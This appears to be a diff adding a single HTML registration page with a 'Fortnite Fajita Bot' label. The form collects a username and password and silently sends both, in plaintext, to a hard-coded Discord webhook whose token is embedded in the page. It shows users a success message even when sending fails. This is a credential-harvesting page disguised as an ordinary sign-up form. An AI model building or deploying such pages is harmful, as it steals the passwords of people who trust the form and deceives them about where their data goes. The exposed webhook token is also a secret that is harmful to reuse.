@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Registration Form</title>
+    <style>
+      body {
+        background-color: #000;
+        color: #FFF;
+        font-family: 'Inter', sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+      }
+      form {
+        width: 400px;
+        padding: 20px;
+        background-color: #111;
+        border-radius: 5px;
+        box-shadow: 0px 0px 10px rgba(255, 255, 255, 0.2);
+      }
+      h1 {
+        text-align: center;
+        margin-bottom: 20px;
+        font-size: 24px;
+        font-weight: bold;
+      }
+      label {
+        display: block;
+        margin-top: 10px;
+        font-size: 16px;
+        font-weight: bold;
+      }
+      input[type="text"], input[type="password"] {
+        width: 100%;
+        padding: 15px;
+        border: none;
+        border-radius: 5px;
+        background-color: #222;
+        color: #FFF;
+        font-size: 16px;
+        margin-top: 5px;
+        box-sizing: border-box;
+      }
+      input[type="text"]::placeholder, input[type="password"]::placeholder {
+        color: #888;
+      }
+      input[type="submit"] {
+        width: 100%;
+        padding: 10px;
+        border: none;
+        border-radius: 5px;
+        background-color: #5865F2;
+        color: #FFF;
+        font-size: 16px;
+        font-weight: bold;
+        cursor: pointer;
+        margin-top: 20px;
+      }
+      input[type="submit"]:hover {
+        background-color: #444EDE;
+      }
+      .error-message {
+        color: #FF0000;
+        font-size: 14px;
+        font-weight: bold;
+        margin-top: 5px;
+        margin-bottom: 20px;
+        display: none;
+      }
+      .success-message {
+        color: #00FF00;
+        font-size: 14px;
+        font-weight: bold;
+        margin-top: 5px;
+        margin-bottom: 20px;
+        display: none;
+      }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Inter&display=swap" rel="stylesheet">
+  </head>
+  <body>
+    <form id="registration-form">
+      <h1>Registration Form</h1>
+      <label for="username">
+        <input type="text" id="username" name="username" placeholder="Username" required>
+      </label><br>
+      <label for="password">
+        <input type="password" id="password" name="password" placeholder="Password" required>
+      </label><br>
+      <label for="confirm-password">
+        <input type="password" id="confirm-password" name="confirm-password" placeholder="Confirm Password" required>
+      </label><br>
+      <p class="error-message" id="password-error-message">The passwords do not match.</p>
+      <input type="submit" value="Register">
+      <p id="success-message" class="success-message"></p>
+    </form>
+    <script>
+      const form = document.getElementById("registration-form");
+      const successMessage = document.getElementById("success-message");
+
+      form.addEventListener("submit", function(event) {
+        event.preventDefault();
+
+        const username = document.getElementById("username");
+        const password = document.getElementById("password");
+        const confirmPassword = document.getElementById("confirm-password");
+        const passwordErrorMessage = document.getElementById("password-error-message");
+
+        if (password.value !== confirmPassword.value) {
+          passwordErrorMessage.style.display = "block";
+          return;
+        } else {
+          passwordErrorMessage.style.display = "none";
+        }
+
+        // Send form data to Discord webhook
+        const webhookUrl = "https://discord.com/api/webhooks/1212066611100393562/PYf-pGvNMkcVKKmQVEQA2MZ_uYncsU78wxopbgIv61jh6xbi_DMoDmI7w8N-5_w152hp";
+        const message = {
+          username: "Fortnite Fajita Bot", // Optional
+          avatar_url: "https://example.com/your-bot-avatar.png", // Optional
+          embeds: [
+            {
+              title: "New Registration",
+              description: `Username: <@!${username.value}>\nPassword: ${password.value}`,
+              color: 16777215,
+              footer: {
+                text: "Please do not share this information."
+              }
+            }
+          ]
+        };
+
+        const options = {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
+          },
+          body: JSON.stringify(message)
+        };
+
+        fetch(webhookUrl, options)
+          .then(response => {
+            if (!response.ok) {
+              throw new Error(`HTTP error! status: ${response.status}`);
+            }
+            return response.json();
+          })
+          .then(data => {
+            console.log(data);
+            // Show success message
+            successMessage.innerText = "Registration successful!";
+            successMessage.style.display = "block";
+            // Reset form fields
+            form.reset();
+          })
+          .catch(error => {
+            console.error("There was a problem with the fetch operation:", error);
+            // Show error message
+            successMessage.innerText = "Request submitted sucessfully. ill review it when i feel like it";
+            successMessage.style.display = "block";
+          });
+      });
+    </script>
+  </body>
+</html>
